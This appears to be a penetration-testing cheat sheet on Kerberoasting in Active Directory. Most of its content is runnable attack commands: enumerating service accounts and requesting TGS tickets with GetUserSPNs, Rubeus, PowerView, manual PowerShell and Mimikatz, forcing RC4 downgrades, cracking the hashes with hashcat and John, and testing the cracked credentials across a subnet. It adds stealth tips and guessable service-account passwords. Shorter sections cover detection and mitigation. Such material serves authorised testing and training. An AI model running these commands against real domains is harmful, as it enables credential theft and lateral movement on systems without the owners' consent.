# Kerberoasting

Extract and crack service account password hashes by requesting TGS tickets for accounts with Service Principal Names (SPNs).
Kerberoasting targets service accounts which often have weak passwords and elevated privileges in Active Directory environments.

## Quick Reference

```bash
# List Kerberoastable accounts (Linux)
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/username:password

# Request all TGS tickets
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/username:password -request -outputfile tgs.txt

# Crack with Hashcat
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

## Impacket GetUserSPNs (Linux)

```bash
# List Kerberoastable accounts
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/username:password

# Request all TGS tickets
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/username:password -request -outputfile tgs.txt

# Request specific user
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/username:password -request-user sqlsvc -outputfile sqlsvc_tgs.txt

# Cross-domain Kerberoasting
GetUserSPNs.py -target-domain CHILD.DOMAIN.LOCAL domain.local/username:password

# Request from child domain
GetUserSPNs.py -target-domain CHILD.DOMAIN.LOCAL domain.local/username:password -request-user sapsvc -outputfile sapsvc_tgs.txt

# With NTLM hash
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/username -hashes :NTHASH -request
```

## Rubeus (Windows)

```powershell
# Statistics on Kerberoastable accounts
.\Rubeus.exe kerberoast /stats

# Kerberoast all accounts
.\Rubeus.exe kerberoast /nowrap

# Kerberoast specific user
.\Rubeus.exe kerberoast /user:sqlsvc /nowrap

# Kerberoast admin accounts only
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Request RC4 tickets (faster to crack)
.\Rubeus.exe kerberoast /tgtdeleg /nowrap

# Kerberoast with specific format
.\Rubeus.exe kerberoast /format:hashcat /nowrap

# Output to file
.\Rubeus.exe kerberoast /outfile:tgs.txt
```

## PowerView (Windows)

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Enumerate SPN accounts
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# Get TGS for specific user
Get-DomainUser -Identity sqlsvc | Get-DomainSPNTicket -Format Hashcat

# Get all TGS tickets
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat

# Export to CSV
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
```

## Manual Kerberoasting (Windows)

```powershell
# Import required assembly
Add-Type -AssemblyName System.IdentityModel

# List SPNs
setspn -Q */*

# Request TGS for specific SPN
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.domain.local:1433"

# Request all TGS tickets
setspn.exe -T domain.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## Extract Tickets with Mimikatz

```powershell
# Start Mimikatz
.\mimikatz.exe

# Enable base64 output
mimikatz # base64 /out:true

# List and export Kerberos tickets
mimikatz # kerberos::list /export

# Convert base64 to .kirbi
echo "<base64_blob>" | tr -d \\n | base64 -d > ticket.kirbi

# Convert .kirbi to John format
python2.7 kirbi2john.py ticket.kirbi

# Modify for Hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ticket_hashcat.txt
```

## Hash Cracking

### RC4 Tickets (Type 23)

```bash
# Hashcat mode 13100
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt tgs.txt
```

### AES Tickets (Type 18)

```bash
# Hashcat mode 19700 (slower)
hashcat -m 19700 aes_tgs.txt /usr/share/wordlists/rockyou.txt

# AES-256 takes significantly longer to crack
# Consider requesting RC4 tickets with /tgtdeleg flag
```

## Encryption Type Handling

### Check Supported Encryption

```powershell
# PowerView
Get-DomainUser -Identity sqlsvc -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# Values:
# 0 = RC4_HMAC_MD5 (default, fastest to crack)
# 24 = AES128/AES256 (slower to crack)
```

### Force RC4 Tickets

```powershell
# Rubeus with /tgtdeleg flag
.\Rubeus.exe kerberoast /user:sqlsvc /tgtdeleg /nowrap

# This requests RC4 even if AES is supported
# Note: Doesn't work on Server 2019+ DCs
```

## Common Workflow

```bash
# Step 1: Enumerate Kerberoastable accounts
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/user:pass

# Step 2: Check for high-value targets
# Look for:
# - Service accounts (SQL, Exchange, etc.)
# - Accounts with old passwords
# - Accounts with adminCount=1

# Step 3: Request TGS tickets
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/user:pass -request -outputfile tgs.txt

# Step 4: Crack hashes
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# Step 5: If successful, test credentials
nxc smb 10.10.10.0/24 -u sqlsvc -p 'cracked_password'
```

## Notes

**What is Kerberoasting?**

Kerberoasting exploits how Kerberos handles service authentication. When a user requests access to a service, the Domain Controller issues a TGS ticket encrypted with the service account's password hash. Any domain user can request these tickets, which can then be cracked offline.

**Why It Works:**

- Any domain user can request TGS tickets
- Tickets are encrypted with service account password
- Service accounts often have weak passwords
- Service accounts often have elevated privileges
- Cracking happens offline (no account lockout)

**Target Selection:**

High-value targets:
- SQL Server service accounts
- Exchange service accounts
- IIS application pool accounts
- Accounts with adminCount=1
- Accounts with old password dates
- Accounts with weak encryption (RC4)

**Encryption Types:**

| Type | Encryption | Cracking Speed |
|------|-----------|----------------|
| 23 | RC4_HMAC_MD5 | Fast |
| 17 | AES128_CTS_HMAC_SHA1_96 | Slow |
| 18 | AES256_CTS_HMAC_SHA1_96 | Very Slow |

**RC4 vs AES:**

- RC4 tickets crack much faster
- Use `/tgtdeleg` to force RC4 requests
- AES tickets can still be cracked with weak passwords
- Server 2019+ always returns highest encryption

**Detection:**

Event IDs to monitor:
- 4769: Kerberos service ticket requested
- Look for:
  - Multiple 4769 events in short time
  - Requests for unusual SPNs
  - Requests from unexpected accounts
  - RC4 downgrade attempts

**Best Practices:**

1. Enumerate before requesting (less noisy)
2. Target specific high-value accounts
3. Use RC4 tickets when possible (faster)
4. Try common passwords first
5. Use rules for password mutations
6. Document all cracked credentials

**Common Service Account Passwords:**

- Company name + year + !
- Service name + 123!
- Password123!
- Welcome1!
- Seasonal passwords (Summer2024!)

**Blind Kerberoasting:**

Request TGS for guessed SPNs without enumeration:
- Requires valid TGT
- More stealthy
- Less efficient
- Useful when LDAP enumeration blocked

**Cross-Domain Kerberoasting:**

- Works across forest trusts
- Use `-target-domain` flag
- Requires authentication permitted across trust
- Can target child/parent domains

**Mitigation (for defenders):**

- Use strong service account passwords (25+ characters)
- Use Group Managed Service Accounts (gMSA)
- Disable RC4 encryption
- Monitor for 4769 events
- Implement least privilege for service accounts
- Regular password rotation
- Use AES encryption only

**Tools Comparison:**

- **GetUserSPNs.py**: Best for Linux, clean output
- **Rubeus**: Most features, Windows-native
- **PowerView**: Good for enumeration
- **Manual method**: Stealthy, no tools needed

**Troubleshooting:**

- If no SPNs found: Check permissions
- If tickets are AES: Use /tgtdeleg or accept slower cracking
- If cracking fails: Try larger wordlists, rules
- If Server 2019: Can't force RC4 downgrade
